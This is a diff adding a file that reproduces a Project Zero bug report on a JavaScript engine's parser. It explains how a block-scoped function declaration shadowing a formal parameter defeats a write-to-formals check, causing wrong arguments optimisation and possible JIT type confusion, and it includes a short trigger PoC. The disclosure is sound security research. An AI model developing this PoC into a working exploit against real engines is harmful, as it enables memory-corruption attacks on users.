@@ -1,0 +1,41 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1367
+
+In the following JavaScript code, both of the print calls must print out "undefined" because of "x" is a formal parameter. But the second print call prints out "function x() { }". This bug may lead to type confusion in JITed code.
+
+function f(x) {
+    print(x);
+
+    {
+        function x() {
+
+        }
+    }
+
+    print(x);
+}
+
+The following code in "PreVisitFunction" is used to decide how to optimize arguments.
+    bool doStackArgsOpt = (!pnode->sxFnc.HasAnyWriteToFormals() || funcInfo->GetIsStrictMode());
+
+"HasAnyWriteToFormals" set by "Parser::BindPidRefsInScope" returns true in the following example code where "x" is formal. But the method can't detect the above buggy case, so it may end up wrongly optimizing arguments.
+
+function f(x) {
+    x = 1;
+}
+
+
+PoC:
+*/
+
+function f(x) {
+    arguments;
+
+    {
+        function x() {
+        }
+    }
+}
+
+for (let i = 0; i < 10000; i++)
+    f();
